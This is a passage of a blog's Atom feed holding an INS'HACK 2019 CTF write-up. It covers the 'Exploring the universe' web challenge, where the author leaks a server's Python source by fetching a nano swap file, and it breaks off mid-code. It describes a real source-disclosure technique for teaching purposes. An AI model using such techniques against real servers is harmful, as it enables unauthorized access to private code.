<?xml version="1.0" encoding="utf-8"?><feed xmlns="http://www.w3.org/2005/Atom" ><generator uri="https://jekyllrb.com/" version="3.7.4">Jekyll</generator><link href="http://localhost:4000/feed.xml" rel="self" type="application/atom+xml" /><link href="http://localhost:4000/" rel="alternate" type="text/html" /><updated>2019-07-04T21:13:02+02:00</updated><id>http://localhost:4000/feed.xml</id><title type="html">BoiteAKlou’s Infosec Blog</title><subtitle>Computer security oriented blog held by a french student in IT and Networks. This blog aims at teaching the fundamentals of Cyber Security to beginners through CTF write-ups and didactic articles.</subtitle><author><name>BoiteAKlou</name></author><entry><title type="html">INS’HACK CTF Writeups</title><link href="http://localhost:4000/INSHACK-CTF-Writeups.html" rel="alternate" type="text/html" title="INS'HACK CTF Writeups" /><published>2019-05-08T10:00:00+02:00</published><updated>2019-05-08T10:00:00+02:00</updated><id>http://localhost:4000/INSHACK-CTF-Writeups</id><content type="html" xml:base="http://localhost:4000/INSHACK-CTF-Writeups.html">&lt;p&gt;&lt;img src=&quot;http://localhost:4000/assets/2019-05-08/inshack-logo.png&quot; alt=&quot;INSHACK logo&quot; title=&quot;INSHACK logo&quot; width=&quot;40%&quot; /&gt;&lt;/p&gt;

&lt;!--excerpt--&gt;

&lt;h2 class=&quot;no_toc&quot; id=&quot;table-of-contents&quot;&gt;Table of Contents&lt;/h2&gt;

&lt;ul id=&quot;markdown-toc&quot;&gt;
  &lt;li&gt;&lt;a href=&quot;#web-exploring-the-universe&quot; id=&quot;markdown-toc-web-exploring-the-universe&quot;&gt;[Web] Exploring the universe&lt;/a&gt;    &lt;ul&gt;
      &lt;li&gt;&lt;a href=&quot;#statement&quot; id=&quot;markdown-toc-statement&quot;&gt;Statement&lt;/a&gt;&lt;/li&gt;
      &lt;li&gt;&lt;a href=&quot;#resolution&quot; id=&quot;markdown-toc-resolution&quot;&gt;Resolution&lt;/a&gt;&lt;/li&gt;
    &lt;/ul&gt;
  &lt;/li&gt;
  &lt;li&gt;&lt;a href=&quot;#web-almost-tchap&quot; id=&quot;markdown-toc-web-almost-tchap&quot;&gt;[Web] Almost Tchap&lt;/a&gt;    &lt;ul&gt;
      &lt;li&gt;&lt;a href=&quot;#statement-1&quot; id=&quot;markdown-toc-statement-1&quot;&gt;Statement&lt;/a&gt;&lt;/li&gt;
      &lt;li&gt;&lt;a href=&quot;#resolution-1&quot; id=&quot;markdown-toc-resolution-1&quot;&gt;Resolution&lt;/a&gt;&lt;/li&gt;
    &lt;/ul&gt;
  &lt;/li&gt;
  &lt;li&gt;&lt;a href=&quot;#programming-hackcode-0102&quot; id=&quot;markdown-toc-programming-hackcode-0102&quot;&gt;[Programming] HackCode-01/02&lt;/a&gt;    &lt;ul&gt;
      &lt;li&gt;&lt;a href=&quot;#statement-2&quot; id=&quot;markdown-toc-statement-2&quot;&gt;Statement&lt;/a&gt;        &lt;ul&gt;
          &lt;li&gt;&lt;a href=&quot;#example&quot; id=&quot;markdown-toc-example&quot;&gt;Example&lt;/a&gt;&lt;/li&gt;
        &lt;/ul&gt;
      &lt;/li&gt;
      &lt;li&gt;&lt;a href=&quot;#strategy&quot; id=&quot;markdown-toc-strategy&quot;&gt;Strategy&lt;/a&gt;&lt;/li&gt;
      &lt;li&gt;&lt;a href=&quot;#part-01&quot; id=&quot;markdown-toc-part-01&quot;&gt;Part 01&lt;/a&gt;&lt;/li&gt;
      &lt;li&gt;&lt;a href=&quot;#part-02&quot; id=&quot;markdown-toc-part-02&quot;&gt;Part 02&lt;/a&gt;&lt;/li&gt;
    &lt;/ul&gt;
  &lt;/li&gt;
  &lt;li&gt;&lt;a href=&quot;#reverse-dashlame&quot; id=&quot;markdown-toc-reverse-dashlame&quot;&gt;[Reverse] Dashlame&lt;/a&gt;    &lt;ul&gt;
      &lt;li&gt;&lt;a href=&quot;#statement-3&quot; id=&quot;markdown-toc-statement-3&quot;&gt;Statement&lt;/a&gt;&lt;/li&gt;
      &lt;li&gt;&lt;a href=&quot;#uncompyle&quot; id=&quot;markdown-toc-uncompyle&quot;&gt;Uncompyle&lt;/a&gt;&lt;/li&gt;
      &lt;li&gt;&lt;a href=&quot;#understanding-the-script&quot; id=&quot;markdown-toc-understanding-the-script&quot;&gt;Understanding the script&lt;/a&gt;&lt;/li&gt;
      &lt;li&gt;&lt;a href=&quot;#resolution-2&quot; id=&quot;markdown-toc-resolution-2&quot;&gt;Resolution&lt;/a&gt;&lt;/li&gt;
      &lt;li&gt;&lt;a href=&quot;#alternative-way-using-decrypt_archive&quot; id=&quot;markdown-toc-alternative-way-using-decrypt_archive&quot;&gt;Alternative way using decrypt_archive()&lt;/a&gt;&lt;/li&gt;
    &lt;/ul&gt;
  &lt;/li&gt;
  &lt;li&gt;&lt;a href=&quot;#pwn-intergover&quot; id=&quot;markdown-toc-pwn-intergover&quot;&gt;[Pwn] Intergover&lt;/a&gt;    &lt;ul&gt;
      &lt;li&gt;&lt;a href=&quot;#statement-4&quot; id=&quot;markdown-toc-statement-4&quot;&gt;Statement&lt;/a&gt;&lt;/li&gt;
      &lt;li&gt;&lt;a href=&quot;#spotting-the-vulnerabilty&quot; id=&quot;markdown-toc-spotting-the-vulnerabilty&quot;&gt;Spotting the vulnerabilty&lt;/a&gt;&lt;/li&gt;
    &lt;/ul&gt;
  &lt;/li&gt;
  &lt;li&gt;&lt;a href=&quot;#pwn-signed-or-unsigned&quot; id=&quot;markdown-toc-pwn-signed-or-unsigned&quot;&gt;[Pwn] Signed or unsigned&lt;/a&gt;    &lt;ul&gt;
      &lt;li&gt;&lt;a href=&quot;#statement-5&quot; id=&quot;markdown-toc-statement-5&quot;&gt;Statement&lt;/a&gt;&lt;/li&gt;
      &lt;li&gt;&lt;a href=&quot;#spotting-the-vulnerability&quot; id=&quot;markdown-toc-spotting-the-vulnerability&quot;&gt;Spotting the vulnerability&lt;/a&gt;&lt;/li&gt;
    &lt;/ul&gt;
  &lt;/li&gt;
&lt;/ul&gt;

&lt;h2 id=&quot;web-exploring-the-universe&quot;&gt;[Web] Exploring the universe&lt;/h2&gt;

&lt;h3 id=&quot;statement&quot;&gt;Statement&lt;/h3&gt;

&lt;blockquote&gt;
  &lt;p&gt;Will you be able to find the &lt;code class=&quot;highlighter-rouge&quot;&gt;flag&lt;/code&gt; in the &lt;code class=&quot;highlighter-rouge&quot;&gt;universe/&lt;/code&gt; ?&lt;/p&gt;

  &lt;p&gt;I’ve been told that the guy who wrote this nice application called server.py is a huge fan of nano (yeah… he knows vim is better).&lt;/p&gt;

  &lt;p&gt;http://exploring-the-universe.ctf.insecurity-insa.fr/&lt;/p&gt;
&lt;/blockquote&gt;

&lt;p&gt;Here is a screen capture of the website in question:&lt;/p&gt;

&lt;p&gt;&lt;img src=&quot;http://localhost:4000/assets/2019-05-08/exploringtheuniverse.png&quot; alt=&quot;Exploring the universe&quot; title=&quot;Exploring the universe&quot; /&gt;&lt;/p&gt;

&lt;p&gt;The page was quite empty apart from this funny JS game named “JSLander” where you had to land a rocket by controlling its speed and trajectory. Unfortunately, a successful landing gave no flag.&lt;/p&gt;

&lt;h3 id=&quot;resolution&quot;&gt;Resolution&lt;/h3&gt;

&lt;p&gt;A huge hint was given by the challenge statement about a file named &lt;code class=&quot;highlighter-rouge&quot;&gt;server.py&lt;/code&gt; which would be edited by &lt;code class=&quot;highlighter-rouge&quot;&gt;nano&lt;/code&gt;. After a few guesses, we managed to retrieve the file &lt;code class=&quot;highlighter-rouge&quot;&gt;.server.py.swp&lt;/code&gt; automatically created by &lt;code class=&quot;highlighter-rouge&quot;&gt;nano&lt;/code&gt; when the original file is being edited.&lt;/p&gt;

&lt;p&gt;server.py:&lt;/p&gt;
&lt;div class=&quot;language-python highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;&lt;span class=&quot;kn&quot;&gt;from&lt;/span&gt; &lt;span class=&quot;nn&quot;&gt;pathlib&lt;/span&gt; &lt;span class=&quot;kn&quot;&gt;import&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;Path&lt;/span&gt;
&lt;span class=&quot;kn&quot;&gt;from&lt;/span&gt; &lt;span class=&quot;nn&quot;&gt;mimetypes&lt;/span&gt; &lt;span class=&quot;kn&quot;&gt;import&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;guess_type&lt;/span&gt;
&lt;span class=&quot;kn&quot;&gt;from&lt;/span&gt; &lt;span class=&quot;nn&quot;&gt;aiohttp&lt;/span&gt; &lt;span class=&quot;kn&quot;&gt;import&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;web&lt;/span&gt;

&lt;span class=&quot;n&quot;&gt;ROOT&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;Path&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;()&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;resolve&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;()&lt;/span&gt;
&lt;span class=&quot;k&quot;&gt;print&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;ROOT&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt;
&lt;span class=&quot;n&quot;&gt;PUBLIC&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;ROOT&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;joinpath&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;'public'&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt;

&lt;span class=&quot;n&quot;&gt;async&lt;/span&gt; &lt;span class=&quot;k&quot;&gt;def&lt;/span&gt; &lt;span class=&quot;nf&quot;&gt;stream_file&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;request&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;filepath&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;):&lt;/span&gt;
    &lt;span class=&quot;s&quot;&gt;'''Streams a regular file
    '''&lt;/span&gt;
    &lt;span class=&quot;n&quot;&gt;filepath&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;PUBLIC&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;joinpath&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;filepath&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;resolve&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;()&lt;/span&gt;
    &lt;span class=&quot;k&quot;&gt;if&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;filepath&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;is_dir&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;():&lt;/span&gt;
        &lt;span class=&quot;k&quot;&gt;return&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;web&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;Response&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;headers&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;{&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;'DT'&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;:&lt;/span&gt; &lt;span class=&quot;s&quot;&gt;'DT_DIR'&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;})&lt;/span&gt;
    &lt;span class=&quot;k&quot;&gt;if&lt;/span&gt; &lt;span class=&quot;ow&quot;&gt;not&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;filepath&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;is_file&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;():&lt;/span&gt;
        &lt;span class=&quot;k&quot;&gt;raise&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;web&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;HTTPNotFound&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;headers&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;{&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;'DT'&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;:&lt;/span&gt; &lt;span class=&quot;s&quot;&gt;'DT_UNKNOWN'&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;})&lt;/span&gt;
    &lt;span class=&quot;k&quot;&gt;try&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;:&lt;/span&gt;
        &lt;span class=&quot;n&quot;&gt;filepath&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;relative_to&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;ROOT&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt;
    &lt;span class=&quot;k&quot;&gt;except&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;:&lt;/span&gt;
        &lt;span class=&quot;k&quot;&gt;raise&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;web&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;HTTPForbidden&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;reason&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;&quot;You can't go beyond the universe...&quot;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt;
    &lt;span class=&quot;n&quot;&gt;mime&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;encoding&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;guess_type&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;nb&quot;&gt;str&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;filepath&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;))&lt;/span&gt;
    &lt;span class=&quot;n&quot;&gt;headers&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;{&lt;/span&gt;
        &lt;span class=&quot;s&quot;&gt;'DT'&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;:&lt;/span&gt; &lt;span class=&quot;s&quot;&gt;'DT_REG'&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt;
        &lt;span class=&quot;s&quot;&gt;'Content-Type'&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;:&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;mime&lt;/span&gt; &lt;span class=&quot;ow&quot;&gt;or&lt;/span&gt; &lt;span class=&quot;s&quot;&gt;'application/octet-stream'&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt;
        &lt;span class=&quot;s&quot;&gt;'Content-Length'&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;:&lt;/span&gt; &lt;span class=&quot;nb&quot;&gt;str&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;filepath&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;stat&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;()&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;st_size&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt;
    &lt;span class=&quot;p&quot;&gt;}&lt;/span&gt;
    &lt;span class=&quot;k&quot;&gt;if&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;encoding&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;:&lt;/span&gt;
        &lt;span class=&quot;n&quot;&gt;headers&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;[&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;'Content-Encoding'&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;]&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;encoding&lt;/span&gt;
    &lt;span class=&quot;n&quot;&gt;resp&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;web&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;StreamResponse&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;headers&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;headers&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt;
    &lt;span class=&quot;n&quot;&gt;await&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;resp&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;prepare&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;request&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt;
    &lt;span class=&quot;k&quot;&gt;with&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;filepath&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;nb&quot;&gt;open&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;'rb'&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt; &lt;span class=&quot;k&quot;&gt;as&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;resource&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;:&lt;/span&gt;
        &lt;span class=&quot;k&quot;&gt;while&lt;/span&gt; &lt;span class=&quot;bp&quot;&gt;True&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;:&lt;/span&gt;
            &lt;span class=&quot;n&quot;&gt;data&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;resource&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;read&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;mi&quot;&gt;4096&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt;
            &lt;span class=&quot;k&quot;&gt;if&lt;/span&gt; &lt;span class=&quot;ow&quot;&gt;not&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;data&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;:&lt;/span&gt; &lt;span class=&quot;k&quot;&gt;break&lt;/span&gt;
            &lt;span class=&quot;n&quot;&gt;await&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;resp&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;write&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;data&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt;
    &lt;span class=&quot;k&quot;&gt;return&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;resp&lt;/span&gt;

&lt;span class=&quot;n&quot;&gt;async&lt;/span&gt; &lt;span class=&quot;k&quot;&gt;def&lt;/span&gt; &lt;span class=&quot;nf&quot;&gt;handle_403&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;request&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;):&lt;/span&gt;
    &lt;span class=&quot;s&quot;&gt;'''Stream 403 HTML file
    '''&lt;/span&gt;
    &lt;span class=&quot;k&quot;&gt;return&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;await&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;stream_file&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;request&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;s&quot;&gt;'403.html'&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt;

&lt;span class=&quot;n&quot;&gt;async&lt;/span&gt; &lt;span class=&quot;k&quot;&gt;def&lt;/span&gt; &lt;span class=&quot;nf&quot;&gt;handle_404&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;request&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;):&lt;/span&gt;
    &lt;span class=&quot;s&quot;&gt;'''Stream 404 HTML file
    '''&lt;/span&gt;
    &lt;span class=&quot;k&quot;&gt;return&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;await&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;stream_file&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;request&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;s&quot;&gt;'404.html'&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt;

&lt;span class=&quot;k&quot;&gt;def&lt;/span&gt; &lt;span class=&quot;nf&quot;&gt;create_error_middleware&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;overrides&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;):&lt;/span&gt;
    &lt;span class=&quot;s&quot;&gt;'''Create an error middleware for aiohttp
    '''&lt;/span&gt;
    &lt;span class=&quot;nd&quot;&gt;@web.middleware&lt;/span&gt;
    &lt;span class=&quot;n&quot;&gt;async&lt;/span&gt; &lt;span class=&quot;k&quot;&gt;def&lt;/span&gt; &lt;span class=&quot;nf&quot;&gt;error_middleware&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;request&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;handler&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;):&lt;/span&gt;
        &lt;span class=&quot;s&quot;&gt;'''Handles specific web exceptions based on overrides
        '''&lt;/span&gt;
        &lt;span class=&quot;k&quot;&gt;try&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;:&lt;/span&gt;
            &lt;span class=&quot;n&quot;&gt;response&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;await&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;handler&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;request&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt;
            &lt;span class=&quot;n&quot;&gt;override&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;overrides&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;get&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;response&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;status&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt;
            &lt;span class=&quot;k&quot;&gt;if&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;override&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;:&lt;/span&gt;
                &lt;span class=&quot;k&quot;&gt;return&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;await&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;override&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;request&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt;
            &lt;span class=&quot;k&quot;&gt;return&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;response&lt;/span&gt;
        &lt;span class=&quot;k&quot;&gt;except&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;web&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;HTTPException&lt;/span&gt; &lt;span class=&quot;k&quot;&gt;as&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;ex&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;:&lt;/span&gt;
            &lt;span class=&quot;n&quot;&gt;override&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;overrides&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;get&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;ex&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;status&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt;
            &lt;span class=&quot;k&quot;&gt;if&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;override&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;:&lt;/span&gt;
                &lt;span class=&quot;k&quot;&gt;return&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;await&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;override&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;request&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt;
            &lt;span class=&quot;k&quot;&gt;raise&lt;/span&gt;
    &lt;span class=&quot;k&quot;&gt;return&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;error_middleware&lt;/span&gt;

&lt;span class=&quot;k&quot;&gt;def&lt;/span&gt; &lt;span class=&quot;nf&quot;&gt;setup_error_middlewares&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;app&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;):&lt;/span&gt;
    &lt;span class=&quot;s&quot;&gt;'''Setup error middleware on given application
    '''&lt;/span&gt;
    &lt;span class=&quot;n&quot;&gt;error_middleware&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;create_error_middleware&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;({&lt;/span&gt;
        &lt;span class=&quot;mi&quot;&gt;403&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;:&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;handle_403&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt;
        &lt;span class=&quot;mi&quot;&gt;404&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;:&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;handle_404&lt;/span&gt;
    &lt;span class=&quot;p&quot;&gt;})&lt;/span&gt;
    &lt;span class=&quot;n&quot;&gt;app&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;middlewares&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;append&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;error_middleware&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt;

&lt;span class=&quot;n&quot;&gt;async&lt;/span&gt; &lt;span class=&quot;k&quot;&gt;def&lt;/span&gt; &lt;span class=&quot;nf&quot;&gt;root&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;request&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;):&lt;/span&gt;
    &lt;span class=&quot;s&quot;&gt;'''Web server root handler
